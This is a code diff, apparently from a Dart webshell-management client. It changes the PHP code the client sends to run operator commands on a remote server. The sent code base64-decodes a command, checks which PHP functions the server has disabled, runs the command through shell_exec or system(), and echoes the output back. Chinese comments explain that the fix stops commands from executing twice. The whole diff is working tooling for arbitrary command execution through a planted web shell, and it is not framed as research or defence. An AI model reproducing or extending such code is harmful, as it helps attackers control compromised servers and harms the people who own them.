@@ -200,10 +200,13 @@ echo encrypt(json_encode(\$result));
       '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}',
     ));
     // 与 php_eval 完全一致，raw string 中 $ 不转义（Dart 仅 ${} 会插值）
+    // 与 php_eval 同款修正：只在 shell_exec 被禁用时才走 system()，
+    // 避免静默命令因 shell_exec 返回 null 而被执行第二次。
     final code =
         "\$c=base64_decode('$b64');"
-        r"$o=@shell_exec($c.' 2>&1');"
-        r"if($o===null){$o=@system($c);}echo $o;";
+        r"$df=preg_split('/[\s,]+/',(string)@ini_get('disable_functions'),-1,PREG_SPLIT_NO_EMPTY);"
+        r"if(function_exists('shell_exec')&&!in_array('shell_exec',$df,true)){echo (string)@shell_exec($c.' 2>&1');}"
+        r"else{@system($c.' 2>&1');}";
     final r = await _sendPhp(code);
     return r.trim();
   }
